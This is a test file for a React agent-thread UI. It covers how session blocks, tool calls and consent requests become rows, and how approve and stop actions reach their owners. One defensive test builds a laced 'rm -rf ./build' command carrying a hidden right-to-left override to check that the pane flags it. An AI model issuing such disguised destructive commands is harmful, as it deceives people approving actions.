// Lane BF2: the Thread (software-factory:thread, DLW §19.4) on its owners — the session's own conversation, read from AIKit's
// encounter view (the reading the thread pane draws), the Agent's shared keys, the agency tracks as its sessions — and the Agent's
// `thread`, `models` and `harnesses` filled from the same readings (src/agent/devices/threadBinding.ts, designBindings.ts,
// FactoryDeviceChain.tsx). Owners write, faces read: Approve and Hard stop go to the session's encounter verbs, the composer and Input
// the Agent's own way, the view's keys stay the shell's; every act no owner carries is refused by name and drawn disabled with why.
//
// Channels:
// - REAL CAPTURE: the encounter blocks, statuses and actions below are trimmed from the installed owner's answers on this machine,
//   16 Oct 2026 (`aikit session-space -C Work/O-I encounter --request-json '{"action":"view","agent_session":…}'`, sessions
//   fx-aletheia-20260926-201904, o-i-chat-1790087010-4a70, o-i-chat-1791392656-7658); the client status and model catalogue are
//   `aikit --json client status` and `aikit model-catalogue show --json`. The lane's scratch `shapes/` holds them whole.
// - FIXTURE: a pending consent request (none waits on this machine), an ACP-shaped tool update (the cradle's operations.ts shape; the
//   O-I sessions here run pi-rpc), and the owners behind the ports (a permission and a cancel that record their calls). No write
//   ever reaches the owner's real state.
// - SCRIPTED: the catalogue's Thread rendered through the runtime's host (deviceHost.HostedDevice) to static markup. Not a screen pass.
import test from 'node:test'
import assert from 'node:assert/strict'
import {register} from 'node:module'
import {readFileSync} from 'node:fs'

const compiler = new URL('../node_modules/typescript/lib/typescript.js', import.meta.url).href
const boundary = new URL('packages/expressions-boundary/src/', new URL('../../../../', import.meta.url)).href
register(`data:text/javascript,${encodeURIComponent(`
import ts from ${JSON.stringify(compiler)};
import {readFile} from 'node:fs/promises';
const BOUNDARY = ${JSON.stringify(boundary)};
export async function resolve(specifier,context,next){
  if(specifier.startsWith('@epilogos/expressions-boundary/'))return next(BOUNDARY+specifier.slice('@epilogos/expressions-boundary/'.length)+'.ts',context);
  try{return await next(specifier,context)}catch(error){
    if(!specifier.startsWith('.'))throw error;
    if(specifier.endsWith('.js')){try{return await next(specifier.slice(0,-3)+'.ts',context)}catch{}}
    for(const suffix of ['.ts','.tsx','/index.ts','/index.tsx']){try{return await next(specifier+suffix,context)}catch{}}
    throw error;
  }
}
export async function load(url,context,next){
  if(url.endsWith('.css'))return {format:'module',shortCircuit:true,source:'export default null'};
  if(url.endsWith('.ts')||url.endsWith('.tsx')){
    const source=await readFile(new URL(url).pathname,'utf8');
    const {outputText}=ts.transpileModule(source,{compilerOptions:{target:ts.ScriptTarget.ES2022,module:ts.ModuleKind.ESNext,jsx:ts.JsxEmit.ReactJSX},fileName:url});
    return {format:'module',shortCircuit:true,source:outputText};
  }
  return next(url,context);
}`)}`, {parentURL: import.meta.url})

globalThis.document = {getElementById: () => null, createElement: () => ({}), head: {appendChild: () => {}}, documentElement: {}}
const {createElement} = await import('react')
const {renderToStaticMarkup} = await import('react-dom/server')
const {designKey} = await import('../src/frame/devices/designs.ts')
const host = await import('../src/frame/devices/deviceHost.tsx')
const bind = await import('../src/agent/devices/designBindings.ts')
const thread = await import('../src/agent/devices/threadBinding.ts')
// The devices are of the families' admitted faces (lane BF3: the thread, tasks and attempt-review faces are admitted).
const familyDoor = await import('../src/inhabitants/familyManifest.ts')
familyDoor.resetFamilyManifestsForTest()
;(await import('../src/inhabitants/loadAgentShellFamilies.ts')).loadAgentShellFamilies()
;(await import('../src/inhabitants/worldShellFamilies.ts')).loadWorldShellFamilies()
const {foundHarnesses} = await import('../src/agent/useHarnessBinding.ts')
const {catalogueModels} = await import('../src/agent/devices/useModelCatalogue.ts')
const {design: threadDesign} = await import('../src/inhabitants/catalogue/panels/thread.tsx')
const {THREAD_PAGE} = await import('../src/agent/devices/oneAgentBinding.ts')
const {design: agentDesign} = await import('../src/inhabitants/catalogue/panels/actuation__harness-model.tsx')

const views = ['folded', 'compact', 'whole', 'full', 'widget']
const hosted = (designed, binding) => {
  const said = console.error
  console.error = (first, ...rest) => { if (!String(first).includes('useLayoutEffect does nothing on the server')) said(first, ...rest) }
  try { return views.map(view => renderToStaticMarkup(createElement(host.HostedDevice, {designed, binding, view, nav: {}}))) } finally { console.error = said }
}
const escaped = text => text.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
const read = path => readFileSync(new URL(`../src/agent/${path}`, import.meta.url), 'utf8')

// ---- the owner's real shapes (16 Oct, trimmed) ---------------------------------------------------------------------------
const CALL = 'call_9436435152cb41b6a47cc746'
const COMMAND = 'ctrl --json action run projectcentral.now.inspect \'{"project":"O-I"}\' 2>&1 | python3 -c "\nimport json'
const tool = (type, extra = {}) => JSON.stringify({args: {command: COMMAND}, toolCallId: CALL, toolName: 'bash', type, ...extra})
const ALETHEIA = {schema: 'aikit.encounter-view/v1', agent_session: 'agent-session/fx-aletheia-20260926-201904', more: true, draft: {revision: 4, text: ''}, permissions: [],
  blocks: [
    {id: 761, kind: 'user', text: '[owner → agent/aletheia] Corrective turn on your Return actexplainrun01m3fny3-reusable-contrast-2026-09-26.'},
    {id: 765, kind: 'assistant', text: 'The Action minted a different id (`…-2026-09-26-2`). Per your stop condition I halt here.'},
    {id: 766, kind: 'tool', text: tool('tool_execution_start')},
    {id: 767, kind: 'tool', text: tool('tool_execution_update', {partialResult: {content: []}})},
    {id: 768, kind: 'tool', text: tool('tool_execution_update', {partialResult: {content: [{type: 'text', text: 'status = success\nid = actexplainrun01m3fny3-reusable-contrast-2026-09-26-2'}]}})},
    {id: 769, kind: 'assistant', text: 'Stopped per your condition — the identical actor/kind/subject return was accepted but minted a new id.'},
    {id: 770, kind: 'completed', text: ''},
  ],
  connection: {error: null, resident: false, state: 'Disconnected'},
  actions: [
    {enabled: true, reason: null, ref: 'aikit.encounter.draft'},
    {enabled: false, reason: 'A ready resident provider is required', ref: 'aikit.encounter.prompt'},
    {enabled: false, reason: 'There is no active provider turn', ref: 'aikit.encounter.cancel'},
    {enabled: false, reason: 'Only an actual pending provider consent request can be answered; this does not confer Actuation authority', ref: 'aikit.encounter.permission'},
  ]}
const DISCONNECTED = ALETHEIA.connection
const FAILED = {id: 938, kind: 'tool', text: '{"Failed":{"reason":"429 Rate limit reached for requests"}}'}
const ERROR = {id: 938, kind: 'error', text: '{"Failed":{"reason":"429 Rate limit reached for requests"}}'}
const RESIDENT = {connection_generation: '01M4BNAHQSPT3SZ6NDVH0RAFR8', error: null, native_session_id: '01a11755-5952-7085-94df-12a3ce242014',
  provider: {id: 'pi', label: 'Pi', protocol: 'pi-rpc', command: 'pi'}, resident: true, state: 'Resident'}
/** A payload the view split (o-i-chat-1790095416-e090: a tool block's text cut mid-JSON, and its continuation). */
const SPLIT = [{id: 50, kind: 'tool', text: '{"args":{"command":"cd /Users/admin/Central/worktrees/env-2/factory; f=/Users/admin/.local/bin/factory; echo \\"=== CHECK ===\\"'},
  {id: 51, kind: 'tool', text: ' one call, never inflated into separate tools\\",\\n        \\"raw-events-preserved'}]
const CLIENT_STATUS = {clients: [
  {client: 'claude', harness: 'claude-code', detection: 'detected', installed: true}, {client: 'pi', harness: 'pi', detection: 'detected', installed: false},
  {client: 'grok', harness: 'grok', detection: 'not-installed', installed: null}, {client: 'broker'},
]}
const CATALOGUE = {catalogued: 2, shown: 2, standing: 'catalogue identity only — a catalogued Model is not thereby available', entries: [
  {model: 'model:aion-2.0', name: 'AionLabs: Aion-2.0', source: 'source/aikit-provider-catalog', declared_routes: [], book: null},
  {model: 'model:glm-5.1', name: 'Z.ai: GLM 5.1', source: 'source/aikit-provider-catalog', declared_routes: [], book: null},
]}

// ---- fixtures ------------------------------------------------------------------------------------------------------------
const CONSENT = {native_request_id: 'req-1', native_session_id: 'n-1', tool_call_id: CALL, raw: {}, provenance: [],
  tool_call: {kind: 'execute', title: 'bash', rawInput: {command: 'tsc --noEmit -p packages/live-shell/ui'}},
  choices: [{option_id: 'allow-always', label: 'Always', kind: 'allow_always'}, {option_id: 'allow-once', label: 'This time', kind: 'allow_once'}, {option_id: 'no', label: 'Refuse', kind: 'reject_once'}]}
const ACP = {id: 9, kind: 'tool', text: JSON.stringify({sessionUpdate: 'tool_call_update', toolCallId: 'acp-1', title: 'Read src/agent/AgentShellContext.tsx', kind: 'read', status: 'in_progress',
  locations: [{path: '/repo/src/agent/AgentShellContext.tsx'}], content: [{type: 'content', content: {type: 'text', text: 'export function useAgentShell'}}]})}
const track = (sessionRef, over = {}) => ({sessionRef, purpose: null, agentRef: null, agentName: null, agentAccepted: null, spaceRef: `space/${sessionRef}`, spaceLabel: null, depth: 1,
  parentRef: `space/${sessionRef}`, group: false, memberRefs: [], tasks: [], needle: null, telemetryOn: true, budget: {used: null, max: null}, disclosure: null, ...over})
const TRACKS = [
  {...track('session-space/factory-expressions'), sessionRef: 'session-space/factory-expressions', group: true, depth: 0, parentRef: null},
  track('agent-session/fx-aletheia-20260926-201904', {purpose: 'Explain run', agentRef: 'agent:aletheia', agentName: 'aletheia', needle: {atUnixMs: 1_000_000 - 140_000}, budget: {used: 3, max: 12}}),
  track('agent-session/o-i-chat-1790087010-4a70', {agentName: 'nara'}),
]
const input = (over = {}) => ({selected: 'agent-session/fx-aletheia-20260926-201904', chainSession: 'agent-session/fx-aletheia-20260926-201904', tracks: TRACKS,
  nowUnixMs: 1_000_000, encounter: {reading: ALETHEIA, status: DISCONNECTED}, agent: {}, holds: bind.chainHolds(), ...over})

// ---- the rows -------------------------------------------------------------------------------------------------------------

test('the session\'s stream is the owner\'s blocks as the Thread\'s rows: messages, one row per tool call, failures; nothing inferred', () => {
  const rows = thread.threadRowsOf(ALETHEIA, DISCONNECTED, 'aletheia')
  assert.deepEqual(rows.map(row => row.kind), ['you', 'agent', 'tool', 'agent'], 'the turn boundary (completed) is no item of the stream')
  assert.equal(rows[0].who, 'you')
  assert.equal(rows[1].who, 'aletheia', 'the agent\'s rows carry its roster name')
  const call = rows[2]
  assert.equal(call.tool, 'bash', 'the provider\'s own tool name')
  assert.equal(call.text, 'ctrl --json action run projectcentral.now.inspect \'{"project":"O-I"}\' 2>&1 | python3 -c "', 'the command, its first line')
  assert.match(call.out, /^status = success\nid = actexplainrun01m3fny3/, 'the latest output the provider reported for that call')
  assert.equal(call.state, undefined, 'a call the owner never closed while no turn runs carries no state (never "runs" on the shell\'s say)')
  // In flight, after the last turn's end: the open call runs.
  const live = thread.threadRowsOf({...ALETHEIA, blocks: ALETHEIA.blocks.filter(block => block.kind !== 'completed' && block.id < 769)}, {...RESIDENT, state: 'TurnInFlight'}, null)
  assert.equal(live.find(row => row.kind === 'tool').state, 'runs')
  assert.equal(live.find(row => row.kind === 'agent').who, undefined, 'an agent with no roster name is not named by the shell')
  // A provider failure, in the owner's words; a split payload keeps its first piece, its continuation is no row.
  const odd = thread.threadRowsOf({blocks: [ERROR, ...SPLIT, ACP], permissions: []}, {...RESIDENT, state: 'TurnInFlight'}, null)
  assert.deepEqual(odd[0], {who: 'error', kind: 'text', text: '429 Rate limit reached for requests'})
  assert.equal(odd[1].kind, 'tool')
  assert.match(odd[1].text, /^\{"args":\{"command":"cd \/Users\/admin/)
  assert.deepEqual(odd[2], {kind: 'tool', text: 'Read src/agent/AgentShellContext.tsx', tool: 'read', out: 'export function useAgentShell', state: 'runs'}, 'the ACP shape: its title, kind, content and status')
  assert.equal(odd.length, 3)
  assert.equal(thread.threadRowsOf({blocks: [FAILED], permissions: []}, undefined, null)[0].kind, 'tool', 'a tool block whose JSON is not a call keeps its first line')
})

test('a consent request that waits is a proposal row, and the call it names waits', () => {
  const rows = thread.threadRowsOf({...ALETHEIA, permissions: [CONSENT]}, RESIDENT, 'aletheia')
  assert.equal(rows.find(row => row.kind === 'tool').state, 'waits')
  // be2n ruling 1: the row carries the request as it was sent, for its raw view (PermissionCard.tsx permissionAsSent).
  assert.deepEqual(rows.at(-1), {who: 'aletheia', kind: 'proposal', text: 'aletheia wants to run a command', tool: 'tsc --noEmit -p packages/live-shell/ui',
    raw: JSON.stringify({tool_call: CONSENT.tool_call, choices: CONSENT.choices}, null, 1), request: 'req-1'},
    'the cradle\'s own words for the request (PermissionCard.tsx describePermission), and the request\'s own id for its card\'s answer (be2o ruling 1)')
})

test('the light is the session\'s connection; the sessions are the agency\'s sessions, never a group; the owners\' lists are theirs', () => {
  assert.equal(thread.threadLight(RESIDENT), 'lit')
  assert.equal(thread.threadLight(DISCONNECTED), 'dark')
  assert.equal(thread.threadLight({state: 'Released'}), 'dark')
  assert.equal(thread.threadLight(undefined), 'unknown')
  assert.deepEqual(thread.sessionRowsOf(TRACKS), [
    {id: 'agent-session/fx-aletheia-20260926-201904', name: 'Explain run', agent: 'aletheia', used: 3, cap: 12},
    {id: 'agent-session/o-i-chat-1790087010-4a70', agent: 'nara'},
  ], 'no model, no parent: the reading discloses neither')
  assert.deepEqual(foundHarnesses(CLIENT_STATUS), ['claude-code', 'pi'], 'found here: the owner\'s detection, by its harness name')
  assert.equal(foundHarnesses({}), null)
  assert.deepEqual(catalogueModels(CATALOGUE), ['model:aion-2.0', 'model:glm-5.1'])
  assert.equal(catalogueModels(null), null)
})

// ---- the values -----------------------------------------------------------------------------------------------------------

test('the Thread reads only what an owner reported, the Agent\'s shared keys, and its own view: never the design\'s Flint, tsc or 6 s', () => {
  bind.resetHolds()
  const none = thread.threadValues(input({selected: null, chainSession: null, encounter: null}))
  assert.deepEqual(none, {pin: false, toolRows: 'lines', subagents: 'linked', messages: 'all'}, 'nothing shown: only the view\'s own settings (§17.10\'s defaults)')
  const values = thread.threadValues(input({agent: {input: 'queue', quantize: 'next turn', draft: 'Then land it'}}))
  assert.equal(values.session, 'agent-session/fx-aletheia-20260926-201904')
  assert.equal(values.selected, 'agent-session/fx-aletheia-20260926-201904')
  assert.equal(values.light, 'dark', 'AIKit reports the session disconnected')
  assert.equal(values.age, 140, 'the needle: the session\'s own last check-in')
  assert.deepEqual([values.input, values.quantize, values.draft], ['queue', 'next turn', 'Then land it'], 'one binding feeds both devices')
  assert.equal(JSON.parse(values.thread).length, 4)
  assert.equal(JSON.parse(values.sessions).length, 2)
  for (const key of ['heard', 'writes', 'voice', 'sent']) assert.equal(values[key], undefined, `${key}: no owner reports it`)
  for (const [key, value] of Object.entries(threadDesign.defaults)) {
    if (['pin', 'toolRows', 'subagents', 'messages'].includes(key)) continue
    assert.notDeepEqual([key, values[key]], [key, value], `${key} carries the design's default as if an owner reported it`)
  }
  // The Agent's thread is the same rows; its models and harnesses the owners' lists.
  const agent = bind.agentValues({sessionRef: 's', track: null, nowUnixMs: 0, reading: {attached: null, budget: null, gatewayAdmitted: null, gatewayDoc: null},
    accepted: {}, harness: {binding: 'cursor', resolved: false}, holds: bind.chainHolds(),
    thread: thread.threadJson({reading: ALETHEIA, status: DISCONNECTED}, 'aletheia'), models: catalogueModels(CATALOGUE), harnesses: foundHarnesses(CLIENT_STATUS)})
  assert.equal(agent.thread, values.thread, 'the Agent and the Thread draw one stream')
  assert.deepEqual(JSON.parse(agent.models), ['model:aion-2.0', 'model:glm-5.1'])
  assert.deepEqual(JSON.parse(agent.harnesses), ['claude-code', 'pi'])
  assert.equal(bind.agentValues({sessionRef: null, track: null, nowUnixMs: 0, reading: {}, accepted: {}, harness: {binding: 'c', resolved: false}, holds: bind.chainHolds(), thread: agent.thread}).thread,
    undefined, 'no session: no thread')
})

// ---- the binding ----------------------------------------------------------------------------------------------------------

const recorder = () => {
  const calls = []
  return {calls, agent: {write: async changes => { calls.push(['agent', ...changes.map(change => [change.key, change.value])]) }},
    ports: {permission: async (id, decision) => { calls.push(['permission', id, decision]) }, cancel: async () => { calls.push(['cancel']) }, select: ref => { calls.push(['select', ref]) }}}
}

test('the Thread writes the owners\' way: the composer and Input through the Agent, Approve and Hard stop to the session\'s encounter, the rest refused by name', async () => {
  bind.resetHolds()
  const {calls, agent, ports} = recorder()
  const live = {...ALETHEIA, connection: {...RESIDENT, state: 'TurnInFlight'}, permissions: [CONSENT],
    actions: ALETHEIA.actions.map(action => (action.ref === 'aikit.encounter.cancel' || action.ref === 'aikit.encounter.permission' ? {...action, enabled: true, reason: null} : action))}
  const binding = thread.threadBinding(input({encounter: {reading: live, status: live.connection}}), agent, ports)
  // REPLACED (#725): the Thread's own device keyed to its design — the Thread was retired as a face of its own in the 22 Oct manual rewrite
  // (§19.4: the thread is the Agent's Full; PROGRAMME R25 item 5 "the Agent carries Custody, Identity and the Thread (as its Full)"), so
  // Software Factory admits no Thread face, and the Agent's design carries the Thread's design under `thread.` (oneAgentBinding.ts
  // THREAD_PAGE): each of the Thread's own keys is the Agent's under that prefix.
  // REPLACED (#772): "the Thread's constructor answers null" — the retired constructor is gone: the module exports none.
  assert.equal('threadDevice' in thread, false, 'no Thread device of its own: no constructor stands')
  const ownThread = Object.keys(threadDesign.defaults).filter(key => !THREAD_PAGE.shared.includes(key))
  assert.ok(ownThread.length > 0)
  for (const key of ownThread) assert.ok(`${THREAD_PAGE.prefix}${key}` in agentDesign.defaults, `the Agent carries the Thread's ${key} as ${THREAD_PAGE.prefix}${key}`)
  await binding.write([{key: 'sent', value: 'Skip the cradle root'}, {key: 'draft', value: ''}, {key: 'input', value: 'steer'}])
  await binding.write([{key: 'approve', value: true}])
  await binding.write([{key: 'hardStop', value: true}])
  assert.deepEqual(calls, [
    ['agent', ['sent', 'Skip the cradle root']], ['agent', ['draft', '']], ['agent', ['input', 'steer']],
    ['permission', 'req-1', {outcome: 'selected', option_id: 'allow-once'}], ['cancel'],
  ], 'Approve is the harness\'s own "This time", never an invented choice')
  for (const [key, words] of [['retry', /missing op: a retry of one session's task/], ['diff', /missing op: a proposal's diff/], ['tellParent', /missing op: a stall handed to the parent/],
    ['voice', /dictation lands in the thread pane/], ['light', /The light is a reading/], ['heard', /heard is a reading/]]) {
    await assert.rejects(() => binding.write([{key, value: true}]), words, key)
    if (key !== 'heard') assert.match(binding.standing[key].disabled, words, `${key} stands disabled with why`)
  }
  assert.equal(calls.length, 5, 'no refusal dispatched anything')
  assert.equal(binding.standing.approve, undefined, 'a consent request waits and the owner takes the answer')
  assert.equal(binding.standing.hardStop, undefined, 'a turn runs and the owner takes the cancel')
})

test('what the owner says it cannot take stands disabled in its words; pinned elsewhere, the composer does not pretend to talk here', async () => {
  bind.resetHolds()
  const {calls, agent, ports} = recorder()
  const binding = thread.threadBinding(input(), agent, ports)
  assert.equal(binding.standing.approve.disabled, thread.THREAD_REFUSE.noConsent)
  assert.equal(binding.standing.hardStop.disabled, 'There is no active provider turn', 'the encounter\'s own reason, verbatim')
  await assert.rejects(() => binding.write([{key: 'hardStop', value: true}]), /There is no active provider turn/)
  await assert.rejects(() => binding.write([{key: 'approve', value: true}]), /No consent request waits/)
  // Pin it, then move the selection: it keeps its session, and the words would go to another session's Agent.
  binding.local.pin(true)
  const pinned = thread.threadBinding(input({selected: 'agent-session/o-i-chat-1790087010-4a70', chainSession: 'agent-session/o-i-chat-1790087010-4a70'}), agent, ports)
  assert.equal(pinned.values.session, 'agent-session/fx-aletheia-20260926-201904', 'pinned: it keeps its session')
  assert.equal(pinned.values.selected, 'agent-session/o-i-chat-1790087010-4a70')
  assert.equal(pinned.values.pin, true)
  assert.equal(pinned.standing.sent.disabled, thread.THREAD_REFUSE.pinned)
  await assert.rejects(() => pinned.write([{key: 'sent', value: 'x'}]), /pinned to another session/)
  pinned.local.pin(false)
  assert.equal(thread.threadBinding(input({selected: 'agent-session/o-i-chat-1790087010-4a70'}), agent, ports).values.session, 'agent-session/o-i-chat-1790087010-4a70', 'unpinned: it follows again')
  // Opening a session moves THE selection; the filters are the view's own.
  pinned.local.selected('agent-session/o-i-chat-1790087010-4a70')
  for (const [key, value] of [['toolRows', 'output'], ['subagents', 'inline'], ['messages', 'tools']]) pinned.local[key](value)
  const shown = thread.threadValues(input())
  assert.deepEqual([shown.toolRows, shown.subagents, shown.messages], ['output', 'inline', 'tools'])
  assert.deepEqual(calls, [['select', 'agent-session/o-i-chat-1790087010-4a70']], 'nothing reached an owner')
  bind.resetHolds()
})

test('the Thread draws its design on the binding in all five views: the real stream, "—" for the unread, each refused act disabled with why', () => {
  bind.resetHolds()
  host.resetHost()
  const {agent, ports} = recorder()
  const binding = thread.threadBinding(input({encounter: {reading: {...ALETHEIA, permissions: [CONSENT]}, status: DISCONNECTED}}), agent, ports)
  const drawn = hosted(threadDesign, binding)
  drawn.forEach((markup, index) => {
    assert.match(markup, new RegExp(`data-device-view="${views[index]}"`))
    assert.doesNotMatch(markup, /\bNaN\b|undefined/, `${views[index]}: no absent key drawn as text`)
    assert.doesNotMatch(markup, /data-device-fault/, `${views[index]}: its own view drew`)
    assert.doesNotMatch(markup, /Flint|Type-check the three|tsc roots|claude-sonnet/, `${views[index]}: the fixture\'s sessions never stand in`)
  })
  assert.match(drawn[3], /The Action minted a different id/, 'the pane draws the session\'s own words')
  assert.match(drawn[3], /aletheia wants to run a command/, 'and the consent request that waits')
  assert.match(drawn[3], /<b>bash<\/b>/, 'and the provider\'s tool rows')
  const all = drawn.join('\n')
  // Retry (the session stalled: 140 s past its check-in) and Voice stand disabled with why; Tell parent and Hard stop sit on a stall
  // card, which stands only on a stall row the owner reports — none here.
  for (const key of ['retry', 'voice']) assert.ok(all.includes(escaped(thread.THREAD_REFUSED[key])), `${key}: the control says why it cannot act`)
  assert.ok(all.includes(escaped('Only an actual pending provider consent request can be answered; this does not confer Actuation authority')), 'Approve: the owner\'s own reason')
  assert.match(all, /<button type="button" class="dp-activator"[^>]*disabled=""/, 'the light only reads')
  host.resetHost()
})

test('the Agent\'s light only reads: its standing names Power, so its activator is never pressed only to be refused', () => {
  bind.resetHolds()
  const binding = bind.agentBinding('factory:agent', {sessionRef: 's', track: null, nowUnixMs: 0, reading: {attached: true, budget: null, gatewayAdmitted: null, gatewayDoc: null},
    accepted: {}, harness: {binding: 'cursor', resolved: false}, holds: bind.chainHolds()}, {}, async () => ({kind: 'fired'}), () => true)
  assert.match(binding.standing.light.disabled, /^Power is a reading/)
  const drawn = hosted(agentDesign, binding).join('\n')
  assert.match(drawn, /<button type="button" class="dp-activator" data-light="lit"[^>]*disabled=""/)
  host.resetHost()
})

// ---- the chain ------------------------------------------------------------------------------------------------------------

test('the Thread is the one Agent\'s Full on the session\'s conversation (REPLACED: the Thread beside the Agent and its own pane — R4)', () => {
  const view = read('devices/FactoryDeviceChain.tsx')
  // Was: the Thread stood inside the Agent's slot as its own device, published on the door, and the Agent's ⤢ opened the Thread's Full.
  // Now the Agent carries it as its Thread page (thread.*), composed onto the Agent's binding: one device, its Full the thread.
  assert.doesNotMatch(view, /slot\.id === 'agent' && thread && \(/, 'no Thread stands beside the Agent')
  assert.doesNotMatch(view, /publishDevice\(THREAD_DEVICE_ID, thread/, 'the Thread is not published apart from the Agent')
  assert.match(view, /composeAgentBinding\(agentDesignBinding, \{custody: custodyDesignBinding, identity: identityDesignBinding, thread: threadDesignBinding\}\)/, 'the Thread page on the Agent')
  assert.match(view, /const openAgentThread = \(\) => openDevice\(chainDeviceId\('agent'\), 'Agent'\)/)
  assert.match(view, /threadTrackOf\(tracks, shell\.selectedTrackId, shell\.threadTrackId\)/, 'the session the thread pane shows (AgentThreadView.tsx)')
  assert.match(view, /useEncounterSessions\(observed\)/, 'through the pane\'s own encounter observer')
  assert.match(view, /\{observers\}/)
  assert.match(view, /thread: agentThread, models, harnesses/, 'the Agent\'s thread, models and harnesses filled from the same readings')
  const observer = read('devices/EncounterObserver.tsx')
  // REPLACED (O-I #740 lane B): PROJECT ('O-I'); each session is observed in its own register, the root's when none is named.
  assert.match(observer, /useEncounterSession\(\{project: session\.project \?\? ROOT_REGISTER, ref: session\.ref, space: session\.space\}\)/, 'the store entry the pane shares: the session\'s register, the session, its space')
  assert.match(read('devices/EncounterObservers.tsx'), /lazy\(\(\) => import\('\.\/EncounterObserver'\)\)/, 'the cradle\'s session module loads only when a session is observed')
  assert.doesNotMatch(read('devices/EncounterObservers.tsx') + view + read('devices/threadBinding.ts'), /^import \{[^}]*\} from '[^']*encounter\/session'/m,
    'no module scope import of the walk-instrumented session module (it needs the build\'s __CRADLE_WALK__)')
  assert.match(view, /import \{threadTrackOf\} from '\.\.\/threadTrack'/, 'the pane\'s session rule, without the pane')
  // REPLACED (O-I #740 lane B): 'O-I' twice; the pane and the chain both observe the session's own register (its track's `project`).
  assert.match(read('AgentThreadView.tsx'), /const project = track\.project \?\? ROOT_REGISTER[\s\S]*?project,\n\s+accompanying: \{ref: track\.sessionRef, project, space: track\.spaceRef\}/, 'the pane observes the same key')
  assert.match(view, /\[\{ref: held\.sessionRef, space: held\.spaceRef, project: held\.project \?\? ROOT_REGISTER\}\]/, 'the chain observes it in the same register')
  assert.match(read('AgentThreadView.tsx'), /import \{threadTrackOf\} from '\.\/threadTrack'/, 'and resolves the same session')
  for (const file of ['devices/threadBinding.ts', 'devices/EncounterObservers.tsx', 'devices/EncounterObserver.tsx', 'devices/useModelCatalogue.ts', 'threadTrack.ts']) {
    assert.deepEqual(read(file).match(/#[0-9a-fA-F]{3,8}\b/g) ?? [], [], `${file}: shell tokens only`)
    assert.doesNotMatch(read(file), /\.defaults\[|\.fixtures|catalogue\/panels\//, `${file}: no design default or fixture is read`)
  }
})

// be2n ruling 1 (DLW build ruling 2026-11-11): the Thread answers a consent request too. Where the words its proposal shows are not the
// ones sent, the row carries the card's own line and the request's raw form, and the card draws both, the raw form open. Approve sends
// the harness's own choice by its id: no word of the request, shown or sent, goes with it.
test('the Thread\'s proposal says when what it shows is not what was sent, with its raw form; Approve sends only the harness\'s choice (be2n ruling 1)', async () => {
  bind.resetHolds()
  host.resetHost()
  const SET = /[\p{Cf}\u{2028}\u{2029}\u{3164}]/u
  const LINE = 'The command holds characters that are not shown here. Show raw has it as it was sent.'
  const LACED = {...CONSENT, tool_call: {kind: 'execute', title: 'bash', rawInput: {command: 'rm -rf ./build\u{202e}\nls'}}}
  const row = thread.threadRowsOf({...ALETHEIA, permissions: [LACED]}, RESIDENT, 'aletheia').at(-1)
  // be2o ruling 3: the Thread draws the command on one line, so a command of two lines says that too, after the card's line.
  const NOTE = `${LINE} The command has 2 lines, drawn as one here.`
  assert.deepEqual([row.kind, row.tool, row.note, row.request], ['proposal', 'rm -rf ./build\nls', NOTE, 'req-1'])
  assert.ok(row.raw.includes('rm -rf ./build\\u202e\\nls') && !SET.test(row.raw), row.raw)
  assert.equal('note' in thread.threadRowsOf({...ALETHEIA, permissions: [CONSENT]}, RESIDENT, 'aletheia').at(-1), false, 'a plain request carries no line')
  const live = permissions => ({...ALETHEIA, connection: {...RESIDENT, state: 'TurnInFlight'}, permissions,
    actions: ALETHEIA.actions.map(action => (action.ref === 'aikit.encounter.permission' ? {...action, enabled: true, reason: null} : action))})
  const {calls, agent, ports} = recorder()
  const binding = thread.threadBinding(input({encounter: {reading: live([LACED]), status: RESIDENT}}), agent, ports)
  const drawn = hosted(threadDesign, binding), pane = drawn[views.indexOf('full')]
  assert.ok(pane.includes(`<small class="th-card-note" role="note">${NOTE}</small>`), pane)
  assert.ok(pane.includes('<details class="th-card-raw" open=""><summary>Show raw</summary><pre class="th-out">'), pane)
  assert.ok(pane.includes('rm -rf ./build\\u202e\\nls'), 'the raw form, with the override as its escape')
  for (const [at, markup] of drawn.entries()) assert.ok(!SET.test(markup), `${views[at]}: nothing of the set is drawn`)
  const plain = hosted(threadDesign, thread.threadBinding(input({encounter: {reading: live([CONSENT]), status: RESIDENT}}), agent, ports))[views.indexOf('full')]
  assert.ok(plain.includes('<details class="th-card-raw"><summary>Show raw</summary><pre class="th-out">') && !plain.includes('th-card-note'), 'a plain request keeps its raw form closed, with no line')
  // A row whose line or raw form came laced from elsewhere is still drawn plain.
  const handed = {...binding, values: {...binding.values, thread: JSON.stringify([{who: 'aletheia', kind: 'proposal', text: 'aletheia wants to run a command', tool: 'ls', note: 'Not\u{202e} as sent\u{200b}', raw: '{"a":\u{202e}1}'}])}}
  const again = hosted(threadDesign, handed)[views.indexOf('full')]
  assert.ok(again.includes('<small class="th-card-note" role="note">Not as sent</small>') && again.includes('<pre class="th-out">{&quot;a&quot;:1}</pre>') && !SET.test(again), again)
  await binding.write([{key: 'approve', value: true}])
  await binding.write([{key: 'decline', value: true}])
  assert.deepEqual(calls, [['permission', 'req-1', {outcome: 'selected', option_id: 'allow-once'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'no'}]],
    'the answer names the choice and carries nothing of the command')
  host.resetHost()
  bind.resetHolds()
})

// ── be2o (DLW build ruling 2026-11-11): the follow-ups of the review of be2n (O-I #968) ─────────────────────────────────────────────

/** Every element of a view, its components run: the tree is walked inside one server render, so a component's hooks have a render to
 * stand in. A press is then the element's own handler, called as the browser would call it. */
const nodesOf = element => {
  let nodes = []
  const walk = node => {
    if (Array.isArray(node)) { node.forEach(walk); return }
    if (!node || typeof node !== 'object' || !('props' in node)) return
    nodes.push(node)
    const type = node.type
    if (typeof type === 'function') walk(type(node.props))
    else if (type && typeof type === 'object' && typeof type.type === 'function') walk(type.type(node.props))
    else walk(node.props.children)
  }
  const Probe = () => { nodes = []; walk(element); return null }
  const said = console.error
  console.error = (first, ...rest) => { if (!String(first).includes('useLayoutEffect does nothing on the server')) said(first, ...rest) }
  try { renderToStaticMarkup(createElement(Probe)) } finally { console.error = said }
  return nodes
}
const buttonsOf = (nodes, label) => nodes.filter(node => node.type === 'button' && node.props.children === label)
/** A view's props on a binding, its sets recorded in order. */
const propsOn = (binding, over = {}) => {
  const sets = []
  return {sets, p: {v: binding.values, owner: binding.values, set: (key, value) => { sets.push([key, value]) }, nav: {}, page: '', setPage() {}, standing: binding.standing, ...over}}
}
